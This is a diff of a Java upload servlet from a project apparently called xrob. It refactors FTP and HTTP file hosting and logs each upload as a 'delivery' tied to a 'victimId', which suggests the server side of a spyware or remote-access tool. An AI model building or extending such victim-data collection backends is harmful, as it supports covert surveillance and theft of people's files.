@@ -9,6 +9,7 @@ import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.FilePart;
 import com.theah64.xrob.api.utils.FileUploader;
 import org.apache.commons.net.ftp.FTPClient;
+import org.json.JSONObject;
 import sun.java2d.pipe.BufferedTextPipe;
 
 import javax.servlet.ServletException;
@@ -34,6 +35,7 @@ public class UploadServlet extends AdvancedBaseServlet {
 
     private static final String KEY_FILE = "file";
     private static final int FTP_THRESHOLD_IN_MB = 50;
+    private static final String KEY_DOWNLOAD_LINK = "download_link";
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
@@ -73,7 +75,6 @@ public class UploadServlet extends AdvancedBaseServlet {
 
         if (!hasError) {
 
-
             //Yes,it's a valid data type
             final Part dataFilePart = getHttpServletRequest().getPart(KEY_FILE);
 
@@ -84,12 +85,13 @@ public class UploadServlet extends AdvancedBaseServlet {
 
                 System.out.println("Using server : " + server);
 
+                final FilePart filePart = new FilePart(dataFilePart);
+                final String downloadLink;
                 if (sizeInMb > FTP_THRESHOLD_IN_MB) {
 
                     System.out.println("Using FTP to host the file...");
 
                     //Use FTP to upload the file.
-                    final FilePart filePart = new FilePart(dataFilePart);
                     final String fileName = filePart.getRandomFileName();
 
                     final FTPClient ftpClient = new FTPClient();
@@ -101,28 +103,37 @@ public class UploadServlet extends AdvancedBaseServlet {
 
                     ftpClient.storeFile(server.getFolderToSave() + "/" + fileName, dataFilePart.getInputStream());
 
-                    final String downloadLink = String.format("http://%s%s", server.getFtpDomain(), fileName);
-
+                    downloadLink = String.format("http://%s%s", server.getFtpDomain(), fileName);
                     System.out.println("File uploaded");
-
                     ftpClient.logout();
-
-                    //Success message
-                    getWriter().write(new APIResponse("File uploaded", Media.COLUMN_DOWNLOAD_LINK, downloadLink).getResponse());
-
-                    //What ever the data_type, adding delivery;
-                    deliveries.addv2(new Delivery(victimId, false, message, dataType, -1));
 
                 } else {
                     //Use direct HTTP
                     System.out.println("Using HTTP to host the file");
 
-                    final boolean isFileUploaded = FileUploader.upload(dataFilePart, server.getUploadUrl());
-
+                    final JSONObject joUploadResp = FileUploader.upload(filePart, server);
+                    if (!joUploadResp.getBoolean(KEY_ERROR)) {
+                        //No error file successfully uploaded
+                        downloadLink = joUploadResp.getString(KEY_DOWNLOAD_LINK);
+                    } else {
+                        throw new Exception(joUploadResp.getString(KEY_MESSAGE));
+                    }
                 }
 
+
+                if (downloadLink != null) {
+                    //File hosted
+                    getWriter().write(new APIResponse("File added", "download_link", downloadLink).getResponse());
+                } else {
+                    getWriter().write(new APIResponse("Fa   iled to add file").getResponse());
+                }
+
+                //What ever the data_type, adding delivery;
+                deliveries.addv2(new Delivery(victimId, false, message, dataType, -1));
+
+
             } else {
-                final String errorMessage = KEY_DATA + " is missing";
+                final String errorMessage = KEY_FILE + " is missing";
 
                 deliveries.addv2(new Delivery(victimId, true, "ERROR: " + errorMessage + " , MESSAGE: " + message, dataType, -1));
 
